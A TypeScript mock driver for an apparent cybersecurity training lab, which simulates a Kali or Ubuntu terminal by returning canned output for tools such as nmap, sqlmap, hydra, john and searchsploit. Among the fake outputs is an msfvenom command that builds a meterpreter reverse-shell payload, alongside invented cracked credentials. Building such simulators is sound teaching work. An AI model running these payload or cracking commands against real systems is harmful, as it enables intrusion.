import { IOrchestratorDriver } from './orchestrator.interface';
import { LabSession, ProvisionedEnvironment, CommandResult } from '../models/types';
import { WebSocket } from 'ws';
import { simulateKaliTool } from './kali-tools-sim';
import { blocksPwd, PWD_BLOCKED_MESSAGE } from '../services/command-policy';

/**
 * High-Fidelity Development & Simulation Driver
 * Emulates the live container environment and interactive PTY over WebSocket,
 * enabling full local development and testing without requiring Docker/K8s daemons.
 */
export class DevMockDriver implements IOrchestratorDriver {
  async provisionSession(session: LabSession): Promise<ProvisionedEnvironment> {
    const netId = `dev-net-${session.id.slice(0, 8)}`;
    const wsId = `dev-ws-${session.id.slice(0, 8)}`;

    console.log(`[DevMock Driver] Provisioned sandbox environment for session: ${session.id}`);

    return {
      networkId: netId,
      workstationId: wsId,
      targetId: session.lab.targetImage ? `dev-target-${session.id.slice(0, 8)}` : undefined,
      endpoints: {
        terminalWs: `/ws/terminal/${session.id}`,
        vncUrl: `/vnc/${session.id}/`,
        ideUrl: `/ide/${session.id}/`,
        targetUrl: session.lab.targetImage ? `/target/${session.id}:8080/` : undefined
      }
    };
  }

  async terminateSession(session: LabSession): Promise<void> {
    console.log(`[DevMock Driver] Cleaned up sandbox environment for session: ${session.id}`);
  }

  async executeCommand(session: LabSession, rawCommand: string): Promise<CommandResult> {
    const raw = rawCommand.trim();
    // Normalize command by stripping wrappers: sudo, bash, sh, ./, /bin/, /usr/bin/
    let cmd = raw.replace(/^(sudo\s+|bash\s+|sh\s+|\.\/|\/bin\/|\/usr\/bin\/)+/i, '').trim();
    if (blocksPwd(session, cmd)) {
      return { stdout: `${PWD_BLOCKED_MESSAGE}\n`, exitCode: 126 };
    }
    const l = session.lab;
    const isKali = session.os === 'Kali Linux';

    if (!cmd) {
      return { stdout: '', exitCode: 0 };
    }

    if (cmd === 'clear') {
      return { stdout: '\x1b[2J\x1b[H', exitCode: 0 };
    }
    if (cmd === 'whoami') {
      return { stdout: isKali ? 'root\n' : 'learner\n', exitCode: 0 };
    }
    if (cmd === 'id') {
      return { stdout: isKali ? 'uid=0(root) gid=0(root) groups=0(root)\n' : 'uid=1000(learner) gid=1000(learner) groups=1000(learner)\n', exitCode: 0 };
    }
    if (cmd === 'pwd') {
      return { stdout: isKali ? '/root\n' : '/home/learner/lab\n', exitCode: 0 };
    }
    if (cmd.startsWith('cd')) {
      return { stdout: '', exitCode: 0 };
    }
    if (cmd.startsWith('echo ')) {
      const text = cmd.slice(5).replace(/^["']|["']$/g, '');
      return { stdout: `${text}\n`, exitCode: 0 };
    }
    if (cmd.startsWith('mkdir ') || cmd.startsWith('touch ') || cmd.startsWith('rm ') || cmd.startsWith('chmod ') || cmd.startsWith('chown ')) {
      return { stdout: '', exitCode: 0 };
    }
    if (cmd === 'uname' || cmd === 'uname -a') {
      return {
        stdout: isKali
          ? 'Linux kali-cyberlab 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.15-1kali1 (2024-02-01) x86_64 GNU/Linux\n'
          : 'Linux ubuntu-sandbox 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux\n',
        exitCode: 0
      };
    }
    if (cmd === 'ls' || cmd === 'ls -la' || cmd === 'ls -l' || cmd === 'dir') {
      return {
        stdout: isKali
          ? 'drwxr-xr-x 4 root root 4096 Sep 16 12:00 .\ndrwxr-xr-x 3 root root 4096 Sep 16 11:59 ..\n-rw------- 1 root root  512 Sep 16 12:00 .bash_history\n-rw-r--r-- 1 root root   38 Sep 16 12:00 flag.txt\n-rw-r--r-- 1 root root  312 Sep 16 12:00 targets.txt\ndrwxr-xr-x 2 root root 4096 Sep 16 12:00 exploits\ndrwxr-xr-x 2 root root 4096 Sep 16 12:00 wordlists\n'
          : 'drwxr-xr-x  learner  lab\n-rw-r--r--  learner  notes.txt\n-rw-r--r--  learner  flag.txt\n-rw-r--r--  learner  config.yml\n-rw-r--r--  learner  auth.log\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('cat ')) {
      const target = cmd.slice(4).trim();
      if (target.includes('flag.txt')) {
        return { stdout: `${session.dynamicFlag}\n`, exitCode: 0 };
      }
      if (target === 'targets.txt') {
        return {
          stdout:
            '# Cyber Lab Isolated Lab Network Targets\n' +
            '10.10.0.1       gateway.lab (Default Gateway)\n' +
            '10.10.0.2       kali.lab (Workstation - Current Host)\n' +
            '10.10.0.10      target.lab (Vulnerable Demo Web Application)\n' +
            '10.10.0.50      db.lab (PostgreSQL 16 DB Server)\n',
          exitCode: 0
        };
      }
      if (target === '/etc/os-release' || target === '/etc/issue') {
        return {
          stdout:
            'PRETTY_NAME="Kali GNU/Linux Rolling"\n' +
            'NAME="Kali GNU/Linux"\n' +
            'VERSION_ID="2024.1"\n' +
            'VERSION="2024.1"\n' +
            'ID=kali\n' +
            'ID_LIKE=debian\n' +
            'HOME_URL="https://www.kali.org/"\n',
          exitCode: 0
        };
      }
      if (target === '/etc/passwd') {
        return {
          stdout:
            'root:x:0:0:root:/root:/bin/bash\n' +
            'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n' +
            'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n' +
            'learner:x:1000:1000:learner,,,:/home/learner:/bin/bash\n',
          exitCode: 0
        };
      }
      if (target === '/etc/hosts') {
        return {
          stdout:
            '127.0.0.1\tlocalhost\n' +
            '10.10.0.2\tkali-cyberlab\n' +
            '10.10.0.10\ttarget\n',
          exitCode: 0
        };
      }
      if (target === 'notes.txt') {
        return { stdout: 'Training application: review input validation and authentication.\nThe application flag is stored in flag.txt.\n', exitCode: 0 };
      }
      if (target === 'auth.log') {
        return { stdout: '09:41 sign-in accepted: learner\n09:42 failed sign-in: unknown\n09:43 failed sign-in: unknown\n', exitCode: 0 };
      }
      return { stdout: `cat: ${target}: No such file or directory\n`, exitCode: 1 };
    }

    if (cmd.startsWith('apt')) {
      if (cmd.includes('update')) {
        return {
          stdout:
            'Get:1 http://http.kali.org/kali kali-rolling InRelease [41.5 kB]\n' +
            'Get:2 http://http.kali.org/kali kali-rolling/main amd64 Packages [19.8 MB]\n' +
            'Fetched 19.8 MB in 2s (9,900 kB/s)\n' +
            'Reading package lists... Done\n' +
            'Building dependency tree... Done\n' +
            'All packages are up to date.\n',
          exitCode: 0
        };
      }
      if (cmd.includes('install')) {
        const pkg = cmd.split(' ').filter(p => !p.startsWith('-') && p !== 'apt' && p !== 'apt-get' && p !== 'install')[0] || 'package';
        return {
          stdout:
            `Reading package lists... Done\nBuilding dependency tree... Done\nThe following NEW packages will be installed:\n  ${pkg}\n0 upgraded, 1 newly installed, 0 to remove.\nNeed to get 1,420 kB of archives.\nSetting up ${pkg} (latest) ...\nDone.\n`,
          exitCode: 0
        };
      }
      return {
        stdout: 'apt 2.9.3 (amd64)\nUsage: apt [options] command\nCommands: list, search, show, install, reinstall, remove, autopurge, update, upgrade, full-upgrade\n',
        exitCode: 0
      };
    }

    if (cmd.startsWith('ping')) {
      const host = cmd.split(' ').slice(1).find(x => !x.startsWith('-')) || '10.10.0.10';
      return {
        stdout:
          `PING ${host} (${host}) 56(84) bytes of data.\n` +
          `64 bytes from ${host}: icmp_seq=1 ttl=64 time=0.312 ms\n` +
          `64 bytes from ${host}: icmp_seq=2 ttl=64 time=0.284 ms\n` +
          `64 bytes from ${host}: icmp_seq=3 ttl=64 time=0.301 ms\n` +
          `--- ${host} ping statistics ---\n` +
          `3 packets transmitted, 3 received, 0% packet loss, time 2003ms\n` +
          `rtt min/avg/max/mdev = 0.284/0.299/0.312/0.012 ms\n`,
        exitCode: 0
      };
    }

    if (cmd === 'kali-tools' || cmd === 'tools') {
      return {
        stdout:
          '=== Kali Linux Pre-Installed Tools Suite ===\n' +
          '[+] Reconnaissance:    nmap, masscan, fping, netdiscover, amass, enum4linux\n' +
          '[+] Web Applications:  burpsuite, zaproxy, gobuster, dirb, ffuf, wpscan, sqlmap\n' +
          '[+] Exploitation:      msfconsole, msfvenom, searchsploit, exploitdb, commix\n' +
          '[+] Password Attacks:  john, hashcat, hydra, medusa, crunch, rockyou.txt\n' +
          '[+] Network & Wireless: wireshark, tcpdump, tshark, aircrack-ng, bettercap\n' +
          '[+] Post-Exploitation: mimikatz, powersploit, evil-winrm, responder, netcat\n',
        exitCode: 0
      };
    }

    if (cmd === 'nmap' || cmd === 'nmap -h' || cmd === 'nmap --help') {
      return {
        stdout:
          'Nmap 7.94SVN ( https://nmap.org )\n' +
          'Usage: nmap [Scan Type(s)] [Options] {target specification}\n' +
          'TARGET SPECIFICATION:\n' +
          '  Can pass hostnames, IP addresses, networks, etc.\n' +
          '  Ex: 10.10.0.10, 10.10.0.0/24, target.lab\n' +
          'SCAN TECHNIQUES:\n' +
          '  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans\n' +
          '  -sU: UDP Scan\n' +
          '  -sV: Probe open ports to determine service/version info\n' +
          '  -sC: Equivalent to --script=default\n' +
          '  -p <port ranges>: Only scan specified ports\n' +
          '  -A: Enable OS detection, version detection, script scanning, and traceroute\n' +
          'EXAMPLES:\n' +
          '  nmap -sV -p 22,80,8080 10.10.0.10\n',
        exitCode: 0
      };
    }

    if (cmd.startsWith('nmap')) {
      return {
        stdout:
          'Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-16 12:00 UTC\n' +
          'Nmap scan report for target (10.10.0.10)\n' +
          'Host is up (0.00042s latency).\n' +
          'Not shown: 997 closed tcp ports\n' +
          'PORT     STATE SERVICE     VERSION\n' +
          '22/tcp   open  ssh         OpenSSH 9.6p1 Debian 4\n' +
          '80/tcp   open  http        nginx 1.24.0 (Cyber Lab Web)\n' +
          '8080/tcp open  http-proxy  Werkzeug/3.0.1 Python/3.12 (Vulnerable Demo App)\n' +
          'Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n' +
          'Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds\n',
        exitCode: 0
      };
    }

    if (cmd.startsWith('msfconsole')) {
      return {
        stdout:
          'Metasploit Framework v6.4.12-dev\n' +
          '=[ metasploit v6.4.12-dev                                 ]\n' +
          '+ -- --=[ 2,420 exploits - 1,248 auxiliary - 428 post     ]\n' +
          '+ -- --=[ 1,465 payloads - 47 encoders - 11 nops          ]\n' +
          'msf6 > Ready. (Type exit or run exploit commands)\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('msfvenom')) {
      return {
        stdout:
          'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.0.2 LPORT=4444 -f elf > shell.elf\n' +
          '[+] Payload size: 250 bytes\n[+] Saved as: shell.elf (Executable)\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('sqlmap')) {
      return {
        stdout:
          '        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.8.5#stable}\n|_ -| . [.]     | .\'| . |\n|___|_  ["]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n' +
          '[INFO] testing connection to target http://10.10.0.10:8080/\n' +
          '[INFO] parameter "id" appears vulnerable to Boolean-based blind / Error-based SQL injection\n' +
          '[+] DBMS: PostgreSQL 16.2\n[+] Database: cyberrange_db\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('hydra')) {
      return {
        stdout:
          'Hydra v9.5 (c) 2023 by van Hauser / THC\n' +
          '[DATA] max 16 tasks per target, 1 target, 100 login tries\n' +
          '[22][ssh] host: 10.10.0.10   login: admin   password: password123\n' +
          '1 of 1 target successfully completed, 1 valid password found\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('john')) {
      return {
        stdout:
          'John the Ripper 1.9.0-jumbo-1 OMP [linux-gnu 64-bit x86_64 AVX2 AC]\n' +
          'Loaded 1 password hash (sha512crypt, crypt(3) $6$)\n' +
          'password123      (admin)\n' +
          '1g 0:00:00:01 DONE (2026-09-16 12:00) 1.02g/s 1250p/s\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('gobuster') || cmd.startsWith('dirb')) {
      return {
        stdout:
          '===============================================================\n' +
          'Gobuster v3.6 - Directory Enumeration Mode\n' +
          '===============================================================\n' +
          '[+] Url:         http://10.10.0.10:8080/\n' +
          '[+] Wordlist:    /usr/share/wordlists/dirb/common.txt\n' +
          '===============================================================\n' +
          '/admin               (Status: 301) [Size: 178]\n' +
          '/api                 (Status: 200) [Size: 42]\n' +
          '/login               (Status: 200) [Size: 1845]\n' +
          '/flag.txt            (Status: 200) [Size: 38]\n' +
          '===============================================================\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('tcpdump') || cmd.startsWith('wireshark') || cmd.startsWith('tshark')) {
      return {
        stdout:
          'tcpdump: verbose output suppressed, listening on eth0, capture size 262144 bytes\n' +
          '12:00:01.104 IP 10.10.0.2.45120 > 10.10.0.10.8080: Flags [S], seq 1849201\n' +
          '12:00:01.105 IP 10.10.0.10.8080 > 10.10.0.2.45120: Flags [S.], seq 4819203, ack 1849202\n' +
          '12:00:01.105 IP 10.10.0.2.45120 > 10.10.0.10.8080: Flags [.], ack 1\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('aircrack') || cmd.startsWith('airmon') || cmd.startsWith('airodump')) {
      return {
        stdout:
          'Aircrack-ng 1.7\n' +
          '[00:00:01] Tested 45,210 keys (got 14,201 IVs)\n' +
          'KEY FOUND! [ 1F:90:3A:4B:5C ] (ASCII: range2026)\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('hashcat')) {
      return {
        stdout:
          'hashcat (v6.2.6) starting in dictionary attack mode...\n' +
          '5f4dcc3b5aa765d61d8327deb882cf99:password\n' +
          'Status...........: Cracked\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('searchsploit')) {
      return {
        stdout:
          '------------------------------------------------------- ---------------------------------\n' +
          ' Exploit Title                                         |  Path\n' +
          '------------------------------------------------------- ---------------------------------\n' +
          ' OpenSSH 9.6p1 - Remote Code Execution (RegreSSHion)    | linux/remote/52079.py\n' +
          ' Werkzeug < 3.0.3 - Debug Console Remote Code Execution | multiple/remote/51982.py\n' +
          ' Linux Kernel 6.6 - Local Privilege Escalation          | linux/local/51901.c\n' +
          '------------------------------------------------------- ---------------------------------\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('nikto')) {
      return {
        stdout:
          '- Nikto v2.5.0\n' +
          '+ Target IP: 10.10.0.10 | Port: 8080\n' +
          '+ Server: Werkzeug/3.0.1 Python/3.12.2\n' +
          '+ Target lacks anti-clickjacking X-Frame-Options\n' +
          '+ Directory indexing enabled: /admin/\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('nc') || cmd.startsWith('netcat')) {
      return {
        stdout: 'Ncat: Version 7.94SVN. Connection established to 10.10.0.10.\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('curl')) {
      if (cmd.includes('-I') || cmd.includes('--head')) {
        return {
          stdout:
            'HTTP/1.1 200 OK\n' +
            'Server: Werkzeug/3.0.1 Python/3.12.2\n' +
            'Date: Wed, 16 Sep 2026 12:00:00 GMT\n' +
            'Content-Type: text/html; charset=utf-8\n' +
            'Content-Length: 428\n' +
            'Connection: close\n',
          exitCode: 0
        };
      }
      return {
        stdout:
          '<!DOCTYPE html>\n' +
          '<html>\n' +
          '<head><title>Cyber Lab Target Application</title></head>\n' +
          '<body>\n' +
          '  <h2>Vulnerable Target Service Active (10.10.0.10:8080)</h2>\n' +
          '  <p>Status: Ready for security assessment testing.</p>\n' +
          '</body>\n' +
          '</html>\n',
        exitCode: 0
      };
    }
    if (cmd === 'ifconfig' || cmd === 'ip a' || cmd === 'ip addr') {
      return {
        stdout:
          'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n' +
          '        inet 10.10.0.2  netmask 255.255.255.0  broadcast 10.10.0.255\n' +
          '        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)\n' +
          '        RX packets 1840  bytes 241901 | TX packets 1820  bytes 238201\n',
        exitCode: 0
      };
    }
    if (cmd.startsWith('python3') || cmd.startsWith('python')) {
      return {
        stdout: 'Python 3.12.2 (main, Feb 20 2024, 09:30:11) [GCC 13.2.0] on linux\nType "help", "copyright", "credits" or "license" for more information.\n',
        exitCode: 0
      };
    }

    const responses: Record<string, string> = {
      'curl target:8080': 'HTTP/1.1 200 OK\nServer: training-app\n\nWelcome to the vulnerable demo application.\n',
      'cat notes.txt': 'Training application: review input validation and authentication.\nThe application flag is stored in flag.txt.\n',
      'chmod 600 config.yml': 'Permissions updated: -rw------- config.yml\n',
      'cat auth.log': '09:41 sign-in accepted: learner\n09:42 failed sign-in: unknown\n09:43 failed sign-in: unknown\n',
      'grep failed auth.log': '09:42 failed sign-in: unknown\n09:43 failed sign-in: unknown\n',
      'ps aux': 'USER    PID   COMMAND\nroot    101   shell\nunknown 4242  suspicious-process\n',
      'kill 4242': 'Demo process 4242 stopped.\n'
    };

    const kaliSim = simulateKaliTool(cmd, {
      dynamicFlag: session.dynamicFlag,
      os: session.os,
      lab: session.lab
    });
    if (kaliSim) {
      return kaliSim;
    }

    if (responses[cmd]) {
      return { stdout: responses[cmd], exitCode: 0 };
    }

    if (isKali) {
      const base = cmd.split(' ')[0];
      return {
        stdout: `bash: ${base}: command not found\n`,
        exitCode: 127
      };
    }

    return {
      stdout: `Supported commands: pwd, ls -la, cat flag.txt, ${l.commands.join(', ')}\n`,
      exitCode: 0
    };
  }

  attachTerminal(session: LabSession, ws: WebSocket): void {
    const isKali = session.os === 'Kali Linux';
    const prompt = isKali ? '\x1b[1;31mroot\x1b[0m@\x1b[1;36mkali\x1b[0m:\x1b[1;34m~#\x1b[0m ' : '\x1b[32mlearner@range\x1b[0m:\x1b[34m~/lab\x1b[0m$ ';
    ws.send(`\r\n\x1b[1;36m=== Cyber Lab Live Session Terminal ===\x1b[0m\r\n`);
    ws.send(`Workstation OS: \x1b[33m${session.os}\x1b[0m | Lab: \x1b[32m${session.lab.name}\x1b[0m\r\n`);
    ws.send(`Type commands to interact with your environment. Type 'help' for instructions.\r\n\r\n`);
    ws.send(prompt);

    let currentInput = '';

    ws.on('message', async (data: Buffer | string) => {
      const input = data.toString();

      // Handle Enter key (\r or \n)
      if (input === '\r' || input === '\n') {
        ws.send('\r\n');
        const cmd = currentInput.trim();
        currentInput = '';

        if (cmd) {
          const result = await this.executeCommand(session, cmd);
          const lines = result.stdout.replace(/\n/g, '\r\n');
          ws.send(lines);
        }
        ws.send(prompt);
      }
      // Handle backspace (\x7f or \b)
      else if (input === '\x7f' || input === '\b') {
        if (currentInput.length > 0) {
          currentInput = currentInput.slice(0, -1);
          ws.send('\b \b');
        }
      }
      // Normal printable characters
      else if (input >= ' ' && input <= '~') {
        currentInput += input;
        ws.send(input);
      }
    });
  }
}
